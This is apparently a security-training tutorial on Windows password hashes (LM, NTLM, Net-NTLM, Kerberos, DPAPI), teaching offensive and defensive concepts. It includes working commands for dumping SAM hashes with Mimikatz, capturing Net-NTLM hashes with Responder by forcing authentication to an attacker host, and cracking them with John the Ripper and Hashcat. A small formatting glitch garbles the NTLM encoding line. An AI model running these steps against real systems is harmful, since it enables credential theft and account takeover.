
---
# **Hashes in Windows**

## **1. Understanding Hash Functions and Their Uses**

A **hash function** is a one-way mathematical function that converts data (like a password) into a fixed-size value (hash). You cannot reverse-engineer the original data from the hash.

P -> H(P)
original password `P' to the hashed value` H(P)

**Why are hash functions used in authentication?**

- They make storing passwords more secure.
    
- They are easy to compute but hard to reverse.
    

### **How authentication works using hashes**

1. User enters a password (P).
    
2. The system computes the hash `H(P)`.
    
3. The system checks if `H(P)` matches a stored hash.
    
4. If it matches, login is successful; otherwise, access is denied.
    

---

## **2. Types of Hashes in Windows**

Windows stores and uses several types of hashes for authentication.

### **2.1 LM (LAN Manager) Hash**

- Very weak and outdated.
    
- Converts password to **uppercase**, splits it into two 7-character parts, encrypts each part, and joins the result.
    
- Disabled by default in Windows Vista and later.
    
- To check if LM hash is enabled, run:
    
    ```powershell
    Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Lsa' -Name 'NoLMHash'
    ```
    
    If the result is `1`, LM hashes are not stored.
    

### **2.2 NTLM Hash**

- Modern way of storing Windows passwords.
    
- Uses **MD4 hashing algorithm** on the UTF-16-encoded password.
    
    MD4(UTF-16-LE(password))
    
    Where `UTF-16-LE' is the little endian of` UTF-**1**
    
- Example:
    
    - Password: `password`
        
    - NTLM Hash: `8846F7EAEE8FB117AD06BDD830B7586C`
        

### **2.3 Net-NTLMv1**

- A challenge-response protocol used when users authenticate to a remote system.
    
- Uses NT hash for authentication.
    
- Can be captured and cracked using tools like **Responder**.
    

### **2.4 Net-NTLMv2**

- An improved version of NTLMv1 with stronger security.
    
- Still vulnerable to relay attacks.
    
- Can also be captured and cracked using **Responder**.
    

To check if a system is using NTLMv1 or NTLMv2:

```powershell
Get-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LMCompatibilityLevel'
```

If this path does not exist, Windows defaults to using **Net-NTLMv2**.

### **2.5 Kerberos**

- Main authentication protocol for Active Directory (AD).
    
- Uses **tickets** instead of password hashes.
    
- More details will be covered in the Active Directory series.
    

### **2.6 DPAPI**

- Used for **encrypting sensitive data** like passwords, certificates, and browser credentials.
    

---

## **3. How to Obtain Hashes**

### **3.1 Extracting LM and NTLM Hashes**

Windows stores NTLM hashes in the **SAM database**. If you have the right privileges, you can extract them using **Mimikatz**:

```powershell
mimikatz64.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

### **3.2 Capturing Net-NTLM Hashes Using Responder**

Net-NTLM hashes can be obtained by tricking a Windows machine into authenticating to an attacker's machine.

**Steps:**

1. Install required tools on a Linux machine:
    
    ```bash
    python3 -m venv venv
    . venv/bin/activate
    pip3 install impacket
    pip install netifaces
    git clone https://github.com/lgandx/Responder.git
    ```
    
2. Start Responder on your network:
    
    ```bash
    cd Responder
    sudo python3 Responder.py -I eth0
    ```
    
3. On the target Windows machine, force authentication:
    
    ```powershell
    dir \\192.168.1.100\test
    ```
    
    This will capture the **Net-NTLM hash**, which can be cracked.
    

---

## **4. Cracking Windows Hashes**

Once you have obtained hashes, you can crack them using **John the Ripper** or **Hashcat**.

### **Get a Wordlist**

A wordlist contains common passwords to test against the hash. The **rockyou.txt** list is popular:

```bash
curl -L https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz > rockyou.txt.tar.gz
tar -xvf rockyou.txt.tar.gz
```

### **Cracking LM Hashes**

```bash
john --format=lm --wordlist=rockyou.txt hash.txt
hashcat -m 3000 -a 3 hash.txt
```

### **Cracking NTLM Hashes**

```bash
john --format=nt --wordlist=rockyou.txt hash.txt
hashcat -m 1000 -a 3 hash.txt
```

### **Cracking Net-NTLMv1 Hashes**

```bash
john --format=netntlm --wordlist=rockyou.txt hash.txt
hashcat -m 5500 -a 3 hash.txt
```

### **Cracking Net-NTLMv2 Hashes**

```bash
john --format=netntlmv2 --wordlist=rockyou.txt hash.txt
hashcat -m 5600 -a 3 hash.txt
```

---

## **5. References**

- [LM, NTLM, Net-NTLMv2, oh my!](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4)
    
- [Windows Privilege Escalation: SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
    
- [Retrieving NTLM Hashes and What Changed in Windows 10](https://www.insecurity.be/blog/2018/01/21/retrieving-ntlm-hashes-and-what-changed-technical-writeup/)
    

---
